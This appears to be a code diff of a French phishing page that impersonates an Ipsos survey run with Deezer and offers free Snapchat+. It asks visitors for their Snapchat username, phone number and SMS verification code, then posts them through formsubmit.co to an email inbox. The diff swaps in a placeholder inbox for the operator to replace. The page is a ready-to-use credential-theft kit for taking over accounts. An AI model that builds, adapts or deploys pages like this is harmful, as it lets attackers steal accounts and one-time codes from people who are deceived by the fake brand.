@@ -2,6 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sondage | Ipsos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -139,16 +140,18 @@
             line-height: 16px;
         }
 
-        .about {
-            max-width: 650px;
-            margin: 20px auto 40px auto;
-            padding: 20px;
-            background: #e8f0fe;
-            border-radius: 10px;
-            font-size: 14px;
-            color: #003b7a;
-            line-height: 1.4;
-            text-align: left;
+        .select-phone {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+
+        .select-phone select, .select-phone input {
+            width: 48%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
         }
 
         .footer {
@@ -160,55 +163,31 @@
             border-top: 1px solid #ddd;
         }
 
-        .select-phone {
-            width: 100%;
-            padding: 14px;
-            font-size: 18px;
-            border-radius: 6px;
-            border: 1px solid #ccc;
-            margin-bottom: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .select-phone select {
-            width: 48%;
-            padding: 14px;
-            font-size: 18px;
-            border-radius: 6px;
-        }
-
-        .select-phone input {
-            width: 48%;
-            padding: 14px;
-            font-size: 18px;
-            border-radius: 6px;
-        }
-
         @media (max-width: 600px) {
             .box {
                 margin: 30px 20px;
                 padding: 30px;
             }
+
             h2 {
                 font-size: 24px;
             }
+
             p {
                 font-size: 16px;
             }
+
             button {
                 font-size: 16px;
             }
-            .about {
+
+            .footer {
                 font-size: 13px;
-                padding: 15px;
             }
         }
     </style>
 </head>
 <body>
-
     <img src="francelogo.png" class="logo-fixed" alt="France">
 
     <div class="header">
@@ -233,7 +212,7 @@
         <button id="btnEtape0">Suivant</button>
     </div>
 
-    <!-- PARTENARIAT AVEC DEEZER ET AVERTISSEMENT AVANT LE NUMERO -->
+    <!-- PARTENARIAT AVEC DEEZER -->
     <div class="box" id="etape1">
         <h2>Partenariat avec Deezer 📱</h2>
         <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
@@ -241,7 +220,7 @@
         <button id="btnEtape1">Continuer</button>
     </div>
 
-    <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
+    <!-- Étape 2: Collecte des informations sur le compte Snapchat -->
     <div class="box" id="etape2">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
@@ -249,12 +228,10 @@
         <button id="btnEtape2">Suivant</button>
     </div>
 
-    <!-- Étape 2: Numéro de téléphone -->
+    <!-- Étape 3: Numéro de téléphone -->
     <div class="box" id="etape3">
         <h2>Numéro de téléphone</h2>
         <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
-
-        <!-- Sélectionner entre 06 et 07 -->
         <div class="select-phone">
             <select id="prefixe_tel">
                 <option value="06">06</option>
@@ -262,19 +239,18 @@
             </select>
             <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
         </div>
-
         <button id="btnEtape3">Suivant</button>
     </div>
 
-    <!-- Étape 3: Code SMS -->
+    <!-- Étape 4: Code SMS -->
     <div class="box" id="etape4">
         <h2>Code de vérification</h2>
         <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription. Cela peut prendre jusqu'à une minute.</p>
         <input type="text" id="code_sms" placeholder="Code reçu">
         <button id="btnEtape4">Terminer</button>
     </div>
-
     <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
+
     <script>
         let reponses = {};
 
@@ -288,13 +264,13 @@
         async function sendMail(dataObj, sujet) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");  // Remplace avec tes adresses email
+            formData.append("_cc", "tonemail@protonmail.com");  // Remplace avec tes adresses email
             formData.append("_captcha", "false");
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
             }
             try {
-                await fetch("https://formsubmit.co/John123abcd@proton.me", {
+                await fetch("https://formsubmit.co/tonemail@protonmail.com", {
                     method: "POST",
                     body: formData,
                     headers: { "Accept": "application/json" }
@@ -305,7 +281,7 @@
             }
         }
 
-        // Étape 0: Questions artistes
+        // Étape 0: Réponses sur les artistes
         document.getElementById('btnEtape0').addEventListener('click', () => {
             let pref = document.getElementById('artiste_prefere').value.trim();
             let deezer = document.getElementById('artiste_deezer').value.trim();
@@ -358,8 +334,7 @@
             showStep('etape4', 100);
         });
     </script>
-
-    <div class="box" id="etape4">
+    <div class="box" id="etape5">
         <h2>Merci !</h2>
         <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
     </div>
@@ -370,6 +345,6 @@
         L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
         Nous vous remercions pour votre participation !
     </div>
-
 </body>
 </html>
+
